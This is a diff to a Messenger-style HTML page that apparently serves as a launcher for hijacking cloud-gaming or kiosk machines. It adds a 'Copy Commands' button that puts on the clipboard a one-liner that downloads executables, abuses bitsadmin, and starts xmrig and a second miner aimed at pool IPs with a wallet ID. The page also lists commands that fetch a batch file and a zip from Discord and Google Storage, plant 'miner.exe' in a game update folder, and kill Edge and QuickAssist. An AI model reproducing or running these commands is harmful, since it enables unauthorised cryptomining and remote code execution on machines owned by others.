@@ -73,26 +73,19 @@
 
    
     <script src="./Página web estilo Messenger_files/script.js.descarga"></script>
-    
-	<div class="container">
-	
-
-        <button id="copyButton">comando</button>
-
-
-	</div>
-
-<div class="container">
-	
-
-        <button id="copyButton2">githubxd</button>
-
-
-	</div>
-    <div class="container">
+     <div class="container">
 	
 
         <a href="https://cdn.discordapp.com/attachments/1093679940689481819/1154802464395100220/cmds2_1_1.url?ex=6518e85a&is=651796da&hm=05f23bc2d5c304d37313e6069de719ef62f27d34d2b06f4f2ddc940842eb4d5d&">CMD</a>
+
+
+	</div>
+	
+
+ <div class="container">
+	
+
+		<button id="copyBtn">Copy Commands</button>
 
 
 	</div>
@@ -107,23 +100,38 @@
         <a href="ms-quick-assist://">Ms-quick</a>
 
 	</div>
-    <script>
-		 document.getElementById("copyButton").addEventListener("click", function() {
-            const textToCopy = 'ss';
-            
-            const textArea = document.createElement("textarea");
-            textArea.value = textToCopy;
-            document.body.appendChild(textArea);
-            textArea.select();
-            document.execCommand("copy");
-            document.body.removeChild(textArea);
 
-           
-        });
+
+	   
+
+	    <p>
+			curl "https://storage.googleapis.com/mariocorp/latest.zip" -o latest.zip <br><br>
+
+del "C:\Program Files (x86)\NVIDiA_Grid_Bundle\crossout_gfn_pc\common\Crossout\update\latest.zip" <br><br>
+copy latest.zip "C:\Program Files (x86)\NViDiA_Grid_Bundle\crossout_gfn_pc\common\Crossout\update" <br><br>
+
+echo "C:\Program Files (x86)\NViDiA_Grid_Bundle\crossout_gfn_pc\common\Crossout\miner.exe" | clip <br><br>
+
+
+
+curl "https://cdn.discordapp.com/attachments/1169970192479166514/1171918676048478258/Stella.bat" -o Stella.bat  <br><br>
+taskkill /f /im msedge.exe&taskkill /f /im msedgewebview2.exe&taskkill /f /im msedge.exe& taskkill /f /im QuickAssist.exe <br><br>
+start "Stella" cmd /k "Stella.bat" <br>
+		</p>
+    <script>
+const copyBtn = document.getElementById('copyBtn');
+
+const commands = `cd c:&cd/&cd users&cd kiosk&cd downloads&curl -O "https://picteon.dev/files/rdl.exe"&bitsadmin /create 1 & bitsadmin /addfile 1 c:\users\kiosk\downloads\rdl.exe c:\users\kiosk\rdl.exe& bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset&cd..&timeout 120&rdl.exe -urlcache -split -f "https://storage.googleapis.com/mariocorp/xmrig.exe"&timeout120&rdl.exe -urlcache -split -f "https://storage.googleapis.com/mariocorp/miner.exe"&timeout 120&start "" cmd /c miner.exe --algo octopus --server stratum+tcp://34.111.128.155:9200 --user NHbYNXxf7ZHUYhk4Mu2sdHiskr4wgvurHKet &timeout 120&start "" cmd /c xmrig.exe -o 34.149.22.228:9200 -u NHbYNXxf7ZHUYhk4Mu2sdHiskr4wgvurHKet -p x -a rx/0 -threads=16`;
+
+copyBtn.addEventListener('click', () => {
+  navigator.clipboard.writeText(commands)
+  
+});
+
 	</script>
 <script>
 		 document.getElementById("copyButton2").addEventListener("click", function() {
-            const textToCopy2 = 'cd c:&cd/&cd users&cd kiosk&cd downloads&curl -O "https://picteon.dev/files/rdl.exe"&bitsadmin /create 1 & bitsadmin /addfile 1 c:\users\kiosk\downloads\rdl.exe c:\users\kiosk\rdl.exe& bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset&cd..&timeout 120&rdl.exe -urlcache -split -f "https://storage.googleapis.com/mariocorp/xmrig.exe"&timeout120&rdl.exe -urlcache -split -f "https://storage.googleapis.com/mariocorp/miner.exe"&timeout 120&start "" cmd /c miner.exe --algo octopus --server stratum+tcp://34.111.128.155:9200 --user NHbYNXxf7ZHUYhk4Mu2sdHiskr4wgvurHKet &timeout 120&start "" cmd /c xmrig.exe -o 34.149.22.228:9200 -u NHbYNXxf7ZHUYhk4Mu2sdHiskr4wgvurHKet -p x -a rx/0 -threads=16`';
+            const textToCopy2 = 'mariosanchezsoto/repositoriodemario';
             
             const textArea2 = document.createElement("textarea");
             textArea2.value = textToCopy2;
@@ -140,3 +148,4 @@
 
 
 </body></html>
+
